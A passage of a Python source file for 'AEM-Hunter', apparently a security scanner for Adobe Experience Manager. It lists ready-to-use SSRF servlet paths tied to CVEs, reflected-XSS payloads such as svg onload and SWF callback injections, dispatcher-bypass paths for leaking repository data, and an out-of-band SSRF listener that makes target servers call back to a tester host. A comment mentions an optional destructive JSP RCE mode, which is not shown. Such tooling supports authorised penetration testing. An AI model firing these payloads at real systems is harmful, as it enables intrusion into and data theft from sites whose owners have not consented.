    ("/etc/reports/userreport.html?path={u}",                              "path",         "ReportingServicesServlet (CVE-2018-12809)", "CVE-2018-12809"),
    ("/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={u}", "url",   "Contentinsight Reporting proxy (CVE-2018-12809)", "CVE-2018-12809"),
    ("/libs/cq/contentinsight/content/proxy.reportingservices.json?url={u}", "url",       "Contentinsight Reporting content proxy", "CVE-2018-12809"),
    ("/bin/reports.json?path={u}",                                         "path",         "Reports JSON", None),
    ("/libs/granite/core/content/forms/components/oauth/google.json?key={u}", "key",       "Google OAuth fetcher", None),
    ("/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={u}&company=x&username=z&secret=y", "datacenter", "SiteCatalyst datacenter SSRF", None),
    ("/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?datacenter={u}&company=x&username=z&secret=y", "datacenter", "SiteCatalyst segments SSRF", None),
    ("/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json?servicename=analytics&analytics.server={u}", "analytics.server", "Autoprovisioning analytics SSRF", None),
]

# Useful regex-derived AEM signatures
RE_AEM_HEADERS = re.compile(r"(?i)(serv(er|let-engine).*sling|day-)|cq[-_]|adobe[-_]experience[-_]manager")
RE_AEM_BODY = re.compile(r"(?i)(granite|Adobe Experience Manager|Sling|/etc/clientlibs/|CQ\.WCM|cq\.shared|CRXDE)")
RE_AUTHOR_HINT = re.compile(r"(?i)(touch-ui|cq\.authoring|authoringUI|x-author)")
RE_PUBLISH_HINT = re.compile(r"(?i)(publish-only|x-publish|dispatcher)")

# A 200 response that is really a login / auth wall. Used everywhere to avoid
# the #1 AEM false positive: console *shells* render to anonymous users while
# the actual functionality stays gated behind login.
RE_LOGIN = re.compile(
    r"(?i)("
    r"j_security_check|j_username|j_password|"
    r"granite\.shell\.login|granite/core/content/login|"
    r"coral-?Login|login-box|cq-Login|loginform|loginpage|"
    r"QUICKSTART|"
    r"<title>[^<]*sign\s*in|please\s+log\s*in|authentication required|"
    r"id=[\"']username[\"']|name=[\"']j_username[\"']|name=[\"']pwd[\"']"
    r")"
)
# Body actually contains secret-like material -> upgrade severity.
RE_SECRET = re.compile(
    r"(?i)("
    r"\"?password\"?\s*[:=]\s*[\"'][^\"']+|"
    r"\"?pwd\"?\s*[:=]\s*[\"'][^\"']+|"
    r"access[_-]?key|secret[_-]?(key|access)|private[_-]?key|"
    r"aws[_-]?(secret|access)|api[_-]?key\"?\s*[:=]|client[_-]?secret|"
    r"-----BEGIN [A-Z ]*PRIVATE KEY-----"
    r")"
)

# ---------------------------------------------------------------------------
# Reflected-XSS-prone SWF files (from 0ang3el/aem-hacker). Present + correct
# content-type (and no Content-Disposition) => likely reflected XSS sink.
# ---------------------------------------------------------------------------
SWF_XSS_PATHS = [
    "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)",
    "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c%22))%7dcatch(e)%7balert(document.domain)%7d//",
    "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alert(document.domain)-String",
    "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?movieName=%22])%7dcatch(e)%7balert(document.domain)%7d//",
    "/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22])%7dcatch(e)%7balert(document.domain)%7d//",
    "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window",
]

# ---------------------------------------------------------------------------
# Data-driven path checks ported from projectdiscovery/nuclei-templates (the
# http/misconfiguration/aem/* set) and Cappricio-Securities/aem-xss. Each entry:
#   (path, [words — ALL must appear in body], severity, category, title)
# Word matchers are taken verbatim from the nuclei templates' matchers.
# ---------------------------------------------------------------------------
NUCLEI_PATH_CHECKS: List[Tuple[str, List[str], str, str, str]] = [
    # --- Reflected XSS (aem-xss + nuclei) ---
    ("/aemhntr<img src=x data'a'onerror=alert(domain)>.childrenlist.html",
     ['<img src="x" data onerror="alert(domain)"/>'], SEV_MEDIUM, CAT_XSS,
     "ChildrenList selector reflected XSS"),
    ("/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html",
     ["<svg onload=alert(document.domain)>"], SEV_MEDIUM, CAT_XSS,
     "ChildrenList JSON-selector reflected XSS"),
    ("/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a",
     ["<svg/onload=confirm(document.domain);>"], SEV_MEDIUM, CAT_XSS,
     "CRXDE setPreferences reflected XSS"),
    ("/libs/cq/ui/widgets.js?debugClientLibs=true&path=<svg/onload=alert(1)>",
     ["<svg/onload=alert(1)>"], SEV_MEDIUM, CAT_XSS,
     "CQ UI widgets debugClientLibs reflected XSS"),
    ("/libs/cq/security/userinfo.json?_charset_=<svg/onload=alert(1)>",
     ["<svg/onload=alert(1)>"], SEV_MEDIUM, CAT_XSS,
     "Security userinfo charset reflected XSS"),
    ("/etc/designs/default/0.gif/<svg%20onload=alert(1)>.html",
     ["<svg onload=alert(1)>"], SEV_MEDIUM, CAT_XSS,
     "Designs default gif reflected XSS"),
    ("/content/<svg/onload=alert(1)>.html",
     ["<svg/onload=alert(1)>"], SEV_LOW, CAT_XSS,
     "/content path reflected XSS"),
    # --- Servlet exposure / info disclosure ---
    ("/libs/dam/merge/metadata.html?path=/etc&.ico", ["assetPaths"], SEV_MEDIUM, CAT_DISCLOSURE,
     "MergeMetadataServlet exposed"),
    ("/system/bgservlets/test.css", ["Flushing output"], SEV_MEDIUM, CAT_EXPOSURE,
     "BackgroundServlet exposed"),
    ("/etc/importers/bulkeditor.html", ["<title>AEM BulkEditor</title>"], SEV_LOW, CAT_EXPOSURE,
     "BulkEditor console exposed"),
    ("/libs/granite/security/content/useradmin.html", ["AEM Security | Users"], SEV_MEDIUM, CAT_EXPOSURE,
     "Security User Admin console exposed"),
    ("/libs/granite/offloading/content/view.html", ["Offloading Browser"], SEV_LOW, CAT_EXPOSURE,
     "Offloading Browser exposed"),
    ("/miscadmin", ["<title>AEM Tools</title>"], SEV_LOW, CAT_EXPOSURE,
     "miscadmin console exposed"),
    ("/libs/cq/ui/content/dumplibs.html", ["<title>Client Libraries</title>"], SEV_LOW, CAT_DISCLOSURE,
     "ClientLibraries dump (dumplibs) exposed"),
    ("/libs/granite/ui/content/dumplibs.test.html", ["Client Libraries Test Output"], SEV_LOW, CAT_DISCLOSURE,
     "ClientLibraries test output exposed"),
    ("/crx/explorer/nodetypes/index.jsp", ["Registered Node Types"], SEV_LOW, CAT_EXPOSURE,
     "CRX node-types admin exposed"),
    ("/libs/granite/operations/content/maintenance.html", ["Maintenance"], SEV_MEDIUM, CAT_EXPOSURE,
     "Granite Maintenance console exposed"),
    ("/libs/granite/operations/content/healthreports.html", ["Health Reports"], SEV_MEDIUM, CAT_EXPOSURE,
     "Health Reports console exposed"),
    ("/libs/granite/operations/content/replicationqueue.html", ["Replication Queue"], SEV_HIGH, CAT_EXPOSURE,
     "Replication Queue console exposed"),
    ("/libs/granite/operations/content/systemoverview.html", ["System Overview"], SEV_MEDIUM, CAT_EXPOSURE,
     "System Overview console exposed"),
    ("/libs/granite/operations/content/diagnosistools.html", ["Diagnosis Tools"], SEV_MEDIUM, CAT_EXPOSURE,
     "Diagnosis Tools console exposed"),
    ("/etc/reports/diskusage.html", ["Disk Usage"], SEV_LOW, CAT_DISCLOSURE,
     "Disk Usage report exposed"),
    ("/bin/crxde/logs?tail=100", ["*WARN*"], SEV_MEDIUM, CAT_DISCLOSURE,
     "CRXDE logs tail exposed"),
    ("/bin/msm/audit.json", ['"results"'], SEV_MEDIUM, CAT_DISCLOSURE,
     "MSM Audit servlet exposed"),
    ("/system/sling/cqform/defaultlogin.html", ["j_username"], SEV_INFO, CAT_EXPOSURE,
     "Sling CQ form login page exposed"),
    # --- Dispatcher-bypass JCR leak via Forms validator (nuclei aem-secrets) ---
    ("//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json",
     ['"jcr:uuid"', '"jcr:createdBy"'], SEV_HIGH, CAT_DISCLOSURE,
     "Forms-validator dispatcher-bypass JCR leak"),
    ("/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json",
     ['"jcr:uuid"', '"jcr:createdBy"'], SEV_HIGH, CAT_DISPATCHER,
     "Forms-validator dispatcher-bypass JCR leak (..;/)"),
    # --- Known CVE-specific markers ---
    ("/etc/clientlibs/foundation/jquery.js", ["jQuery"], SEV_INFO, CAT_DISCLOSURE,
     "Foundation jQuery clientlib present"),
    ("/libs/dam/gui/content/assets.html", ["Assets"], SEV_LOW, CAT_EXPOSURE,
     "DAM Assets console reachable"),
    ("/libs/wcm/core/resources/login.html", ["j_username", "j_password"], SEV_INFO, CAT_EXPOSURE,
     "WCM core login page reachable"),
    ("/libs/granite/core/content/login.html", ["j_username"], SEV_INFO, CAT_EXPOSURE,
     "Granite login page reachable"),
    ("/.json", ['"jcr:primaryType"'], SEV_HIGH, CAT_DISCLOSURE,
     "Repository root JSON readable (/.json)"),
    ("/.tidy.json", ['"jcr:primaryType"'], SEV_HIGH, CAT_DISCLOSURE,
     "Repository root tidy JSON readable"),
    ("/.1.json", ['"jcr:primaryType"'], SEV_HIGH, CAT_DISCLOSURE,
     "Repository root depth-1 JSON readable"),
    ("/.children.json", ['"jcr:primaryType"'], SEV_MEDIUM, CAT_DISCLOSURE,
     "Repository root children.json readable"),
    ("/.feed", ["<feed"], SEV_LOW, CAT_DISCLOSURE,
     "Repository root feed.xml readable"),
    # --- CVE-2016-7882 / WCMDebugFilter ---
    ("/.json?debug=layout", ["res="], SEV_MEDIUM, CAT_XSS,
     "WCMDebugFilter debug=layout reachable (CVE-2016-7882 baseline)"),
    # --- Anonymous read of social/communities ---
    ("/content/usergenerated.json", ['"jcr:primaryType"'], SEV_LOW, CAT_DISCLOSURE,
     "/content/usergenerated readable"),
    # --- Forms / DataServices ---
    ("/lc/contentspace", ["LiveCycle"], SEV_MEDIUM, CAT_EXPOSURE,
     "LiveCycle contentspace exposed"),
    ("/soap/services/listServices", ["Apache CXF", "Axis"], SEV_MEDIUM, CAT_EXPOSURE,
     "SOAP listServices endpoint exposed (AEM Forms)"),
    ("/lc/system/console/configMgr", ["Apache Felix"], SEV_CRITICAL, CAT_EXPOSURE,
     "LiveCycle Felix configMgr exposed"),
    # --- Default error / status pages ---
    ("/libs/sling/servlet/errorhandler/default.html", ["Sling", "ErrorHandler"], SEV_INFO, CAT_DISCLOSURE,
     "Sling default error handler reachable"),
    # --- Old Day CRX admin paths ---
    ("/crx/login.jsp", ["CRX", "Login"], SEV_MEDIUM, CAT_EXPOSURE,
     "CRX login page reachable"),
    # --- AEM Quickstart leftovers ---
    ("/crx/start", ["CRX"], SEV_LOW, CAT_EXPOSURE,
     "CRX start page reachable"),
    # --- Geometrixx / WeRetail demo ---
    ("/content/geometrixx.html", ["Geometrixx"], SEV_MEDIUM, CAT_EXPOSURE,
     "Geometrixx demo content present (insecure default sample)"),
    ("/content/geometrixx-outdoors/en/men.html", ["Geometrixx"], SEV_MEDIUM, CAT_EXPOSURE,
     "Geometrixx-Outdoors demo content present"),
    ("/content/we-retail/us/en.html", ["We.Retail"], SEV_LOW, CAT_EXPOSURE,
     "We.Retail demo content present"),
]

# ---------------------------------------------------------------------------
# Out-of-band SSRF detector (ported from aem-hacker). When --ssrf-callback is
# given, a tiny HTTP listener records callbacks; SSRF servlets are told to fetch
# http://<callback>/<token>/<servletkey>/<id>/ and a hit confirms blind SSRF.
# Needs the AEM target to be able to reach the tester host (won't work via a
# forward proxy like Burp — use an interactsh-style public listener/VPS).
# ---------------------------------------------------------------------------
SSRF_TOKEN = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
SSRF_HITS: Dict[str, List[str]] = {}
SSRF_HITS_LOCK = threading.Lock()

# (key, method, [url templates with {cb}], data template or None, cve)
SSRF_OOB_SERVLETS: List[Tuple[str, str, List[str], Optional[str], Optional[str]]] = [
    ("salesforcesecret", "GET", [
        "/libs/mcm/salesforce/customer.json?customer_key=x&customer_secret=y&refresh_token=z&instance_url={cb}%23",
        "/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url={cb}&customer_key=z&customer_secret=z&redirect_uri=x&code=e",
        "///libs///mcm///salesforce///customer.json?customer_key=x&customer_secret=y&refresh_token=z&instance_url={cb}%23",
    ], None, "CVE-2018-5006"),
    ("reportingservices", "GET", [
        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={cb}%23/api1.omniture.com/a&q=a",
        "/libs/cq/contentinsight/content/proxy.reportingservices.json?url={cb}%23/api1.omniture.com/a&q=a",
    ], None, "CVE-2018-12809"),
    ("sitecatalyst", "GET", [
        "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={cb}%23&company=x&username=z&secret=y",
        "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?datacenter={cb}%23&company=x&username=z&secret=y",
    ], None, None),
    ("autoprovisioning", "POST", [
        "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json",
    ], "servicename=analytics&analytics.server={cb}&analytics.company=1&analytics.username=2&analytics.secret=3&analytics.reportsuite=4", None),
    ("opensocialproxy", "GET", [
        "/libs/opensocial/proxy.json?container=default&url={cb}",
        "/libs/opensocial/proxy?container=default&url={cb}",
    ], None, None),
    ("opensocialmakerequest", "POST", [
        "/libs/opensocial/makeRequest.json?url={cb}",
        "/libs/opensocial/makeRequest?url={cb}",
    ], "httpMethod=GET", None),
    ("linkchecker", "GET", [
        "/libs/wcm/resources/linkchecker.json?path={cb}",
    ], None, None),
]


class _SSRFDetector(BaseHTTPRequestHandler):
    def log_message(self, *a):
        return

    def do_GET(self):
        self._serve()

    def do_POST(self):
        self._serve()

    def do_PUT(self):
        self._serve()

    def _serve(self):
        try:
            parts = self.path.split("/")
            tok, key = parts[1], parts[2]
        except Exception:
            self.send_response(200); self.end_headers(); return
        if tok == SSRF_TOKEN:
            with SSRF_HITS_LOCK:
                SSRF_HITS.setdefault(key, []).append(self.path)
        self.send_response(200)
        self.end_headers()


def start_ssrf_listener(bind_port: int, logger: "Logger"):
    try:
        srv = HTTPServer(("0.0.0.0", bind_port), _SSRFDetector)
    except Exception as e:
        logger.err(f"Could not start OOB SSRF listener on :{bind_port}: {e}")
        return None
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    logger.good(f"OOB SSRF listener bound on 0.0.0.0:{bind_port} (token={SSRF_TOKEN})")
    return srv


# ---------------------------------------------------------------------------
# Logger
# ---------------------------------------------------------------------------
class Logger:
    COLORS = {
        "RESET": "\033[0m", "BOLD": "\033[1m", "DIM": "\033[2m",
        "RED": "\033[31m", "GREEN": "\033[32m", "YELLOW": "\033[33m",
        "BLUE": "\033[34m", "MAGENTA": "\033[35m", "CYAN": "\033[36m",
        "WHITE": "\033[37m", "BRIGHT_RED": "\033[91m",
        "BRIGHT_GREEN": "\033[92m", "BRIGHT_YELLOW": "\033[93m",
        "BRIGHT_CYAN": "\033[96m",
    }
    SEV_COLORS = {
        SEV_CRITICAL: "BRIGHT_RED",
        SEV_HIGH: "RED",
        SEV_MEDIUM: "YELLOW",
        SEV_LOW: "BLUE",
        SEV_INFO: "DIM",
    }

    def __init__(self, verbose: bool = False, no_color: bool = False):
        self.verbose = verbose
        self.no_color = no_color or not sys.stdout.isatty()
        self._lock = threading.Lock()

    def _c(self, name: str) -> str:
        if self.no_color:
            return ""
        return self.COLORS.get(name, "")

    def section(self, msg: str) -> None:
        with self._lock:
            bar = "=" * max(50, len(msg) + 4)
            print(f"\n{self._c('BOLD')}{self._c('BRIGHT_CYAN')}{bar}{self._c('RESET')}")
            print(f"{self._c('BOLD')}{self._c('BRIGHT_CYAN')}  {msg}{self._c('RESET')}")
            print(f"{self._c('BOLD')}{self._c('BRIGHT_CYAN')}{bar}{self._c('RESET')}")

    def info(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('CYAN')}[*]{self._c('RESET')} {msg}")

    def good(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('GREEN')}[+]{self._c('RESET')} {msg}")

    def warn(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('YELLOW')}[!]{self._c('RESET')} {msg}")

    def err(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('RED')}[x]{self._c('RESET')} {msg}", file=sys.stderr)

    def debug(self, msg: str) -> None:
        if self.verbose:
            with self._lock:
                print(f"{self._c('DIM')}[.] {msg}{self._c('RESET')}")

    def finding(self, sev: str, title: str) -> None:
        color = self._c(self.SEV_COLORS.get(sev, "WHITE"))
        with self._lock:
            print(f"{color}[{sev:<8}]{self._c('RESET')} {title}")


# ---------------------------------------------------------------------------
# Findings + Reporter
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    title: str
    severity: str
    category: str
    target: str
    evidence: str = ""
    cve: Optional[str] = None
    description: str = ""
    references: List[str] = field(default_factory=list)
    request: str = ""
    response_snippet: str = ""
    role: Optional[str] = None
    timestamp: str = field(default_factory=lambda: dt.datetime.now().isoformat(timespec="seconds"))


class Reporter:
    def __init__(self, logger: Logger):
        self.findings: List[Finding] = []
        self._lock = threading.Lock()
        self.logger = logger
        self._seen_keys: Set[str] = set()

    def add(self, finding: Finding) -> bool:
        key = f"{finding.severity}|{finding.category}|{finding.title}|{finding.target}|{finding.role or ''}"
        with self._lock:
            if key in self._seen_keys:
                return False
            self._seen_keys.add(key)
            self.findings.append(finding)
            self.logger.finding(finding.severity, f"{finding.title} :: {finding.target}")
            return True

    def by_severity(self) -> List[Finding]:
        return sorted(self.findings, key=lambda f: (-SEV_ORDER.get(f.severity, 0), f.category, f.title))

    def summary(self) -> Dict[str, int]:
        out = {SEV_CRITICAL: 0, SEV_HIGH: 0, SEV_MEDIUM: 0, SEV_LOW: 0, SEV_INFO: 0}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out


# ---------------------------------------------------------------------------
# HTTP client wrapper
# ---------------------------------------------------------------------------
class HttpClient:
    DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AEM-Hunter/" + VERSION

    def __init__(
        self,
        base_url: str,
        timeout: int = 15,
        proxy: Optional[str] = None,
        threads: int = 10,
        verify: bool = False,
        user_agent: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        basic_auth: Optional[Tuple[str, str]] = None,
        custom_headers: Optional[Dict[str, str]] = None,
        rate_limit: float = 0.0,
        logger: Optional[Logger] = None,
        use_http2: bool = False,
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.verify = verify
        self.rate_limit = rate_limit
        self.logger = logger
        self.last_error: Optional[str] = None
        self.backend = "requests"
        self._httpx = None
        self._last_request_ts = 0.0
        self._rl_lock = threading.Lock()

        self.session = requests.Session()
        # Fail fast on dead/unreachable hosts (connect=0); only retry transient
        # 5xx from upstream once. Keeps scans snappy against firewalled paths.
        adapter = HTTPAdapter(
            pool_connections=max(threads * 2, 10),
            pool_maxsize=max(threads * 2, 10),
            max_retries=Retry(total=1, connect=0, read=0, backoff_factor=0.2,
                              status_forcelist=[502, 503, 504]),
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        base_headers = {
            "User-Agent": user_agent or self.DEFAULT_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.8",
        }
        self.session.headers.update(base_headers)
        if custom_headers:
            self.session.headers.update(custom_headers)
        if cookies:
            for k, v in cookies.items():
                self.session.cookies.set(k, v)
        if basic_auth:
            self.session.auth = basic_auth
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        # Optional HTTP/2 backend via httpx (for targets requests can't speak to).
        if use_http2 and _HAS_HTTPX:
            try:
                kw = dict(http2=True, verify=verify, follow_redirects=False,
                          timeout=timeout, headers=dict(self.session.headers),
                          cookies=cookies or {})
                if basic_auth:
                    kw["auth"] = basic_auth
                if proxy:
                    try:
                        self._httpx = httpx.Client(proxy=proxy, **kw)        # httpx >= 0.26
                    except TypeError:
                        self._httpx = httpx.Client(proxies=proxy, **kw)      # older httpx
                else:
                    self._httpx = httpx.Client(**kw)
                self.backend = "httpx"
            except Exception as e:
                self._httpx = None
                self.backend = "requests"
                if logger:
                    logger.warn(f"--http2 requested but httpx HTTP/2 init failed ({e}); "
                                "using requests. Install with: pip install 'httpx[http2]'")
        elif use_http2 and not _HAS_HTTPX and logger:
            logger.warn("--http2 requested but httpx is not installed. "
                        "Install with: pip install 'httpx[http2]'  (using requests for now).")

    def url(self, path: str) -> str:
        if path.startswith("http://") or path.startswith("https://"):
            return path
        if not path.startswith("/"):
            path = "/" + path
        return self.base_url + path

    def _ratelimit(self) -> None:
        if self.rate_limit <= 0:
            return
        with self._rl_lock:
            now = time.time()
            wait = self._last_request_ts + (1.0 / self.rate_limit) - now
            if wait > 0:
                time.sleep(wait)
            self._last_request_ts = time.time()

    def request(self, method: str, path: str, **kwargs):
        self._ratelimit()
        url = self.url(path)
        kwargs.setdefault("timeout", self.timeout)
        if self.backend == "httpx" and self._httpx is not None:
            return self._request_httpx(method, url, **kwargs)
        kwargs.setdefault("verify", self.verify)
        kwargs.setdefault("allow_redirects", False)
        try:
            r = self.session.request(method, url, **kwargs)
            if self.logger:
                self.logger.debug(f"{method} {url} -> {r.status_code} ({len(r.content)} bytes)")
            return r
        except Exception as e:
            # Broad on purpose: a malformed cookie / oversized header / TLS issue
            # should NOT silently kill every request with no explanation. Record
            # the reason so the preflight + session check can surface it.
            self.last_error = f"{e.__class__.__name__}: {e}"
            if self.logger:
                self.logger.debug(f"{method} {url} -> ERR {self.last_error}")
            return None

    def _request_httpx(self, method: str, url: str, **kwargs):
        # Translate the requests-style kwargs to httpx.
        follow = kwargs.pop("allow_redirects", False)
        kwargs.pop("verify", None)  # set on the client
        # requests accepts a raw string/bytes body via data=; httpx wants content=.
        data = kwargs.get("data")
        if isinstance(data, (str, bytes)):
            kwargs.pop("data")
            kwargs["content"] = data
        try:
            r = self._httpx.request(method, url, follow_redirects=follow, **kwargs)
            if self.logger:
                self.logger.debug(f"{method} {url} -> {r.status_code} ({len(r.content)} bytes) [h2={r.http_version}]")
            return r
        except Exception as e:
            self.last_error = f"{e.__class__.__name__}: {e}"
            if self.logger:
                self.logger.debug(f"{method} {url} -> ERR {self.last_error}")
            return None

    def get(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("GET", path, **kwargs)

    def post(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("POST", path, **kwargs)

    def put(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("PUT", path, **kwargs)

    def delete(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("DELETE", path, **kwargs)

    def head(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("HEAD", path, **kwargs)

    def options(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("OPTIONS", path, **kwargs)

    def request_signature(self, method: str, path: str, headers: Optional[Dict] = None,
                          body: Optional[str] = None) -> str:
        lines = [f"{method} {path} HTTP/1.1"]
        if "://" in path:
            host = up.urlparse(path).hostname
        else:
            host = up.urlparse(self.base_url).hostname
        if host:
            lines.append(f"Host: {host}")
        for k, v in (self.session.headers or {}).items():
            lines.append(f"{k}: {v}")
        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        cookie_kv = "; ".join([f"{k}={v}" for k, v in self.session.cookies.get_dict().items()])
        if cookie_kv:
            lines.append(f"Cookie: {cookie_kv}")
        lines.append("")
        if body:
            lines.append(body[:2000])
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def snippet(text: str, n: int = 500) -> str:
    if not text:
        return ""
    t = text.strip()
    if len(t) <= n:
        return t
    return t[:n] + "...[truncated]"


def safe_response_text(r: Optional[requests.Response], n: int = 500) -> str:
    if not r:
        return ""
    try:
        return snippet(r.text, n)
    except Exception:
        try:
            return snippet(r.content.decode("utf-8", "replace"), n)
        except Exception:
            return ""


def normalize_target(target: str) -> str:
    target = target.strip()
    if not target:
        return target
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "https://" + target
    return target.rstrip("/")


def parse_cookie_string(s: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for kv in s.split(";"):
        kv = kv.strip()
        if not kv:
            continue
        if "=" in kv:
            k, v = kv.split("=", 1)
            out[k.strip()] = v.strip()
    return out


def parse_headers_string(s: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for line in s.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def parse_basic_auth(s: str) -> Optional[Tuple[str, str]]:
    if not s:
        return None
    if ":" not in s:
        return None
    u, p = s.split(":", 1)
    return (u, p)


def short_host(target: str) -> str:
    try:
        h = up.urlparse(target).hostname or "target"
        return re.sub(r"[^a-zA-Z0-9._-]", "_", h)
    except Exception:
        return "target"


# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------
class AEMHunter:
    def __init__(self, target: str, logger: Logger, reporter: Reporter,
                 client: HttpClient, threads: int = 10,
                 enable_modules: Optional[Set[str]] = None,
                 fuzz_aggression: str = "normal", exploit: bool = False,
                 ssrf_callback: Optional[str] = None):
        self.target = target
        self.logger = logger
        self.reporter = reporter
        self.client = client
        self.threads = threads
        self.enable_modules = enable_modules  # None means all
        self.fuzz_aggression = fuzz_aggression  # quick / normal / aggressive
        self.exploit = exploit  # enable destructive end-to-end PoCs (JSP RCE)
        self.ssrf_callback = ssrf_callback  # host:port for OOB SSRF via local listener
        self.ssrf_collaborator = None  # Burp Collaborator domain for OOB SSRF (set by run_one_scan)
        self._fingerprint: Dict[str, Any] = {}
        self._csrf_token: Optional[str] = None

    # ---- module gating helper ----
    def _enabled(self, name: str) -> bool:
        if self.enable_modules is None:
            return True
        return name in self.enable_modules

    # ---- auth-wall detection ----
    def _is_authwall(self, r) -> bool:
        """True if the response is really a login page / auth redirect / 401 / 403.

        This is the core false-positive killer: AEM happily serves console HTML
        shells (CRXDE, Package Manager, Felix, etc.) to anonymous users, then
        gates the actual functionality behind login. A 200 that is just the
        login page must NOT be treated as access.
        """
        if r is None:
            return True
        if r.status_code in (401, 403):
            return True
        if 300 <= r.status_code < 400:
            loc = (r.headers.get("Location") or "").lower()
            return any(k in loc for k in ("login", "signin", "sign-in", "sso", "/saml", "auth"))
        # 200 (or other 2xx) — scan a bounded prefix for login markers. Large
        # genuine JCR dumps won't contain these, so this is safe.
        try:
            body = r.text or ""
        except Exception:
            return False
        return bool(RE_LOGIN.search(body[:16000]))

    def _role_tag(self) -> str:
        return "(anonymous)"

    def _who(self) -> str:
        return "anonymously"

    @staticmethod
    def _looks_like_backend_data(body: str) -> bool:
        """True only if the body looks like a real AEM servlet response (JCR JSON,
        QueryBuilder result, OSGi inventory, etc.) rather than a generic page."""
        if not body:
            return False
        bl = body.lstrip()
        low = body.lower()
        if bl[:1] in ("{", "["):
            return any(m in low for m in (
                '"success"', '"hits"', '"results"', '"total"',
                "jcr:primarytype", "symbolicname", '"authorizableid"',
                "rep:user", "rep:group", '"stateraw"',
            ))
        if "<?xml" in bl[:64]:
            return any(m in low for m in ("<feed", "<result", "querybuilder", "<crx"))
        if "apache felix" in low or "crxde lite" in low:
            return True
        return False

    # =======================================================================
    # 1. Fingerprinting
    # =======================================================================
    def fingerprint(self) -> Dict[str, Any]:
        self.logger.section("Fingerprinting")
        fp: Dict[str, Any] = {"is_aem": False, "instance": "unknown",
                              "version": None, "headers": {}, "indicators": []}

        # Root / login / welcome probes
        probe_paths = [
            "/", "/libs/granite/core/content/login.html",
            "/libs/cq/core/content/welcome.html",
            "/etc/clientlibs/granite/utils.js",
            "/system/sling.js",
            "/libs/granite/security/currentuser.json",
        ]
        for p in probe_paths:
            r = self.client.get(p)
            if not r:
                continue
            for h, v in r.headers.items():
                if RE_AEM_HEADERS.search(f"{h}: {v}"):
                    fp["is_aem"] = True
                    fp["headers"][h] = v
                    fp["indicators"].append(f"header {h}: {v}")
            body = safe_response_text(r, 4000)
            if RE_AEM_BODY.search(body):
                fp["is_aem"] = True
                fp["indicators"].append(f"body marker on {p}")
            if RE_AUTHOR_HINT.search(body):
                fp["instance"] = "author"
            elif RE_PUBLISH_HINT.search(body):
                fp["instance"] = "publish"
            m = re.search(r"AEM[^\d]*(6\.\d|2021\.\d+|2022\.\d+|2023\.\d+|2024\.\d+|2025\.\d+|2026\.\d+)", body)
            if m:
                fp["version"] = m.group(0)

        # Granite QuickStart fingerprint
        r = self.client.get("/")
        if r is not None:
            srv = r.headers.get("Server", "")
            if "Jetty" in srv or "Day-Servlet" in srv or "Communique" in srv:
                fp["is_aem"] = True
                fp["indicators"].append(f"server header: {srv}")

        # Heuristic: /etc/clientlibs/granite/utils.js -> 200 / JS is a strong tell
        r = self.client.get("/etc/clientlibs/granite/utils.js")
        if r is not None and r.status_code == 200 and "granite" in (r.text or "").lower():
            fp["is_aem"] = True
            fp["indicators"].append("/etc/clientlibs/granite/utils.js served")

        # Try author-only marker
        r = self.client.get("/libs/granite/security/currentuser.json")
        if r is not None and r.status_code in (200, 401, 403):
            if r.status_code == 200 and "anonymous" in (r.text or "").lower():
                fp["instance"] = "publish"
            elif r.status_code in (401, 403):
                fp["instance"] = "author"

        self._fingerprint = fp
        if fp["is_aem"]:
            self.logger.good(f"AEM signature confirmed (instance={fp['instance']}, version={fp.get('version')})")
            self.reporter.add(Finding(
                title=f"AEM detected ({fp['instance']} instance)",
                severity=SEV_INFO, category=CAT_FINGERPRINT, target=self.target,
